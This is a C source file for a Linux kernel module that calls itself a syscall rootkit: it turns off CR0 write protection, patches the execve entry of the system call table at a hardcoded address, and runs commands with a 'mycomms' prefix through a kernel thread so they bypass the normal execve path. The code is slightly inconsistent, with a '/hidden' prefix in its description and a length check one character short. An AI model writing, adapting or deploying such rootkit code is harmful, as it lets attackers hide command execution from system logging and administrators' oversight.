#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <asm/unistd.h>
#include <asm/pgtable.h>

#define MAX_ARGS 64

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sai");
MODULE_DESCRIPTION("Hooks the execve syscall to suppress logging for commands prefixed with /hidden");

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs*);
//Use cat /proc/kallsyms | grep sys_call_table
#define SYS_CALL_TABLE_ADDR 0xffffffff832002e0 // Change to the correct address of sys_call_table

static sys_call_ptr_t *sys_call_table = (sys_call_ptr_t *)SYS_CALL_TABLE_ADDR;
static sys_call_ptr_t old_execve;
static inline void disable_write_protection(void);
static inline void enable_write_protection(void);

static inline void disable_write_protection(void) {
    unsigned long cr0;
    asm volatile ("mov %%cr0, %0" : "=r" (cr0));
    cr0 &= ~0x00010000;
    asm volatile ("mov %0, %%cr0" :: "r" (cr0));
}

static inline void enable_write_protection(void) {
    unsigned long cr0;
    asm volatile ("mov %%cr0, %0" : "=r" (cr0));
    cr0 |= 0x00010000;
    asm volatile ("mov %0, %%cr0" :: "r" (cr0));
}

static int hidden_command_executor(void *data) {
    char *command = (char *)data;
    char *argv[MAX_ARGS];
    int argc = 0;
    char *token;
    while ((token = strsep(&command, " ")) != NULL && argc < MAX_ARGS - 1) {
        argv[argc++] = token;
    }
    argv[argc] = NULL;
    char *envp[] = { "PATH=/bin:/usr/bin", NULL };
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk(KERN_INFO "hidden_command_executor: Command executed with ret %d\n", ret);

    return ret;
}

static asmlinkage long execve(const struct pt_regs *regs)
{
    char __user *filename = (char __user *)regs->di;
    char kernel_filename[PATH_MAX];
    long ret;

    printk(KERN_INFO "execve: Starting\n");

    memset(kernel_filename, 0, sizeof(kernel_filename));

    if (strncpy_from_user(kernel_filename, filename, sizeof(kernel_filename)) < 0) {
        printk(KERN_ERR "execve: strncpy_from_user failed\n");
        return -EFAULT;
    }

    printk(KERN_INFO "execve: Filename: %s\n", kernel_filename);

    if (strncmp(kernel_filename, "mycomms", 6) == 0) {
        char *new_filename = kernel_filename + 6;
        printk(KERN_INFO "execve: Suppressing logging for %s\n", new_filename);
        new_filename[PATH_MAX - 1] = '\0';
        struct task_struct *task = kthread_run(hidden_command_executor, (void *)new_filename, "hidden_cmd");
        if (IS_ERR(task)) {
            printk(KERN_ERR "execve: Failed to create kernel thread\n");
            return PTR_ERR(task);
        }
        ret = 0;
    } else {
        printk(KERN_INFO "execve: Executing command: %s\n", kernel_filename);
        ret = old_execve(regs);
    }

    printk(KERN_INFO "execve: Finished\n");

    return ret;
}

static int __init syscall_rootkit_init(void)
{
    if (!sys_call_table) {
        printk(KERN_ERR "syscall_rootkit_init: Invalid sys_call_table address\n");
        return -1;
    }
    printk(KERN_INFO "syscall_rootkit_init: Starting\n");
    old_execve = (sys_call_ptr_t)sys_call_table[__NR_execve];
    printk(KERN_INFO "syscall_rootkit_init: old_execve at %px\n", old_execve);
    printk(KERN_INFO "syscall_rootkit_init: execve at %px\n", execve);
    //modifying execve
    disable_write_protection();
    sys_call_table[__NR_execve] = (sys_call_ptr_t)execve;
    enable_write_protection();

    printk(KERN_INFO "syscall_rootkit_init: Finished\n");
    return 0;
}

static void __exit syscall_rootkit_exit(void)
{
    printk(KERN_INFO "syscall_rootkit_exit: Starting\n");
    //restoring to the original execve 
    if (sys_call_table) {
        disable_write_protection();
        sys_call_table[__NR_execve] = old_execve;
        enable_write_protection();
    }

    printk(KERN_INFO "syscall_rootkit_exit: Finished\n");
}

module_init(syscall_rootkit_init);
module_exit(syscall_rootkit_exit);
